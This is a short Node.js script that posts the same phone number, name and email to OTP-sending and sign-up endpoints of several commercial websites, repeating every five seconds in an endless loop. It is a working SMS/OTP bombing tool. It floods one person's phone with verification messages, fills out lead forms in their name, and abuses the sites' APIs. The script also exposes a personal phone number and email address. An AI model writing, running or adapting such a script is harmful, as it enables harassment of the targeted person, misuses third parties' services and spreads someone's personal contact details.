const axios = require("axios");

/* {
  url: "https://www.dotpe.in/curl.php",
  data: {
    name: "Sumil",
    phone: "8171856480",
    email: "sumit1.iphone@gmail.com",
    businessCategory: "Fashion & Accessories",
    source: "https://www.dotpe.in/",
    tncCheck: "true",
  },
}, */

/* {
  url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
  data: { email: "", phone: "8171856480", type: "p", source: "signup", device: "desktop" },
},
 */

const urls = [
  {
    url: "https://blackberrys-otp.marmeto.com/api/otp",
    data: { phone_number: "8171856480" },
  },
  {
    url: "https://www.dotpe.in/curl.php",
    data: {
      name: "Sumil",
      phone: "8171856480",
      email: "sumit1.iphone@gmail.com",
      businessCategory: "Fashion & Accessories",
      source: "https://www.dotpe.in/",
      tncCheck: "true",
    },
  },
  {
    url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
    data: { email: "", phone: "8171856480", type: "p", source: "signup", device: "desktop" },
  },

  {
    url: "https://api.snapmint.com/v1/public/sign_up",
    data: { mobile: "8171856480" },
  },
  {
    url: "https://www.acko.com/auth/api/send-otp/",
    data: {"phone":"8171856480"},
  },

  
];

setInterval(() => {
  urls.forEach((obj, index) => {
    console.log(JSON.stringify(obj));

    console.log("Current index", index);

    const currentObj = {index, obj}
    
    setTimeout(()=>{
      console.log("------------------------kajhdskjah--------------------", JSON.stringify(currentObj))

      axios
      .post(currentObj.obj.url, currentObj.obj.data)
      .then((res) => {
        console.log(`statusCode: ${res.statusCode}`);
        console.log(`statusCode: ${res.status}`);
      })
      .catch((error) => {
        console.error(error);
      });

      
    }, index*1000, currentObj)
    
   /*  axios
      .post(obj.url, obj.data)
      .then((res) => {
        console.log(`statusCode: ${res.statusCode}`);
        console.log(`statusCode: ${res.status}`);
      })
      .catch((error) => {
        console.error(error);
      }); */
  });
}, 5000);
